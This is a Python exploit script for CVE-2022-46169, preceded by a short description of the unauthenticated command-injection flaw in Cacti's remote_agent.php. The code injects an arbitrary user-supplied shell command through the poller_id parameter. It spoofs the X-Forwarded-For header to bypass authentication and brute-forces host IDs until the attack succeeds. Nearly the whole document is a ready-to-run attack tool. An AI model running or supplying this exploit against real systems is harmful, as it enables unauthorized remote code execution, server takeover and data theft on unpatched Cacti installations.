"""
CVE-2022-46169 is a vulnerability that exists in Cacti, a popular open-source network monitoring tool. The vulnerability is an unauthenticated Remote Code Execution (RCE) issue that can allow attackers to execute arbitrary code on the affected system.

The vulnerability exists due to improper sanitization of user input in the "poller_id" parameter in the "remote_agent.php" script. An attacker can exploit this vulnerability by sending a specially crafted HTTP GET request to the vulnerable application, which can execute arbitrary code on the server.

Successful exploitation of this vulnerability can lead to a complete compromise of the affected system, which can result in sensitive data theft, unauthorized access, or other malicious activities.

The vulnerability was assigned a CVSS score of 9.8 (critical), and it affects Cacti versions up to and including 1.2.22. A patch for the vulnerability has been released by the vendor, and it is recommended that all affected users apply the patch as soon as possible to mitigate the risk of exploitation.
"""



import requests

target = input('Enter the URL of the Cacti application: ')

cmd = input('Enter the command to execute: ')

n_ids = int(input('Enter the range of host_ids to try (0 - n): '))
n_localids = int(input('Enter the range of local_data_ids to try (0 - n): '))

payload = f'; /bin/sh -c "{cmd}"'

local_data_ids = [x for x in range(0, n_localids)]
target_ip = target.split("/")[2]

print(f"[*] Trying for 1 - {n_ids} host ids")

for host_id in range(n_ids):
    url = f'{target}/remote_agent.php'
    params = {'action': 'polldata', 'host_id': host_id,
              'poller_id': payload, 'local_data_ids[]': local_data_ids}
    headers = {'X-Forwarded-For': '127.0.0.1'}

    r = requests.get(url, params=params, headers=headers)
    if('proc' in r.text):
        print(f"[+] Exploit Completed for host_id = {host_id}")
        break
